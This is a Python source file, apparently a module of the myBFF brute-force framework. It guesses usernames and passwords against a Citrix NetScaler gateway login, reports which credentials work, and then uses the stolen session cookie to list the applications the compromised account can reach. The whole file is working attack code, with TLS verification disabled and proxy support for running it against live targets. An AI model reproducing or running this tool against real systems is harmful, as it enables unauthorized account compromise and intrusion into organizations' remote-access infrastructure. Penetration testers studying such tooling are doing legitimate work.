#! /usr/bin/python
# Created by Kirk Hayes (l0gan) @kirkphayes
# Part of myBFF
from core.webModule import webModule
from requests import session
import requests
import re
import random
from argparse import ArgumentParser

class citrixBrute(webModule):
    def __init__(self, config, display, lock):
        super(citrixBrute, self).__init__(config, display, lock)
        self.fingerprint="2012 Citrix"
        self.response="Success"
    ignore = ['Settings','Log Off']
    def somethingCool(self, config, c, cookie1, cookies, proxy):
       c.headers.update({'Host': config["HOST"], 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:40.0) Gecko/20100101 Firefox/40.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Referer': config["protocol"] + '://' + config["HOST"] + '/Citrix/XenAppCAGProd23/auth/silentDetection.aspx', 'Accept-Language': 'en-US,en;q=0.5'})
       resp1 = c.get(config["HOST"] +'/Citrix/XenAppCAGProd23/', cookies=cookies, allow_redirects=True, verify=False, proxies=proxy)
       silentDetect = c.get(config["HOST"] + '/Citrix/XenAppCAGProd23/auth/silentDetection.aspx', cookies=cookies, allow_redirects=True, verify=False, proxies=proxy)
       cookie2 = silentDetect.cookies['ASP.NET_SessionId']
       cookies2 = dict()
       cookies2['ASP.NET_SessionId'] = cookie2
       cookies2['NSC_AAAC'] = cookie1
       cookies2['WIClientInfo'] = "Cookies_On#true~icaScreenResolution#1440x900~clientConnSecure#true"
       cookies2['WINGSession'] = "icaScreenResolution#1440x900~streamingClientDetected#~clientConnSecure#true~remoteClientDetected#Ica-Local%3dAuto~icoStatus#IsNotPassthrough"
       cookies2['WIUser'] = "CTX_ForcedClient#Off~CTX_LaunchMethod#Ica-Local"
       resp = c.get(config["HOST"] + '/Citrix/ /auth/login.aspx', cookies=cookies2, allow_redirects=False, verify=False, proxies=proxy)
       resp2 = c.get(config["HOST"] + '/Citrix/XenAppCAGProd23/auth/agesso.aspx', cookies=cookies2, allow_redirects=False, verify=False, proxies=proxy)
       resp3 = c.get(config["HOST"] + '/Citrix/XenAppCAGProd23/site/default.aspx?CTX_MessageType=INFORMATION&CTX_MessageKey=WorkspaceControlReconnectPartialTemp', cookies=cookies2, allow_redirects=False, verify=False, proxies=proxy)
       m = re.search('There are no resources currently available for this user.', resp3.text)
       if m:
           print("[-]      No resources available for user.")
       else:
           m = re.findall('<span>(.*?)</span>', resp3.text, re.DOTALL)
           print("[+]      The following apps are accessible to " + config["USERNAME"] + ":")
           for n in m:
               if n not in self.ignore:
                   print('[+]                 ' + n)
    def connectTest(self, config, payload, proxy, submitLoc, submitType):
        with session() as c:
            requests.packages.urllib3.disable_warnings()
            cpost = c.post(config["HOST"] + '/cgi/login', data=payload, allow_redirects=True, verify=False, proxies=proxy)
            #print cpost.text
            if "set-cookie': 'N" in str(cpost.headers):
                print("[+]  User Credentials Successful: " + config["USERNAME"] + ":" + config["PASSWORD"])
                try:
                    cookie1 = cpost.cookies['NSC_AAAC']
                except (KeyError):
                    print("[-]  An error occurred. Manually check what apps are available.")
                else:
                    cookie1 = cpost.cookies['NSC_AAAC']
                    cookies = dict(NSC_AAAC=cookie1)
                    c.cookies.clear()
                    if not config["dry_run"]:
                        print("[!] Time to do something cool!")
                        self.somethingCool(config, c, cookie1, cookies, proxy)
            else:
                print("[-]  Login Failed for: " + config["USERNAME"] + ":" + config["PASSWORD"])
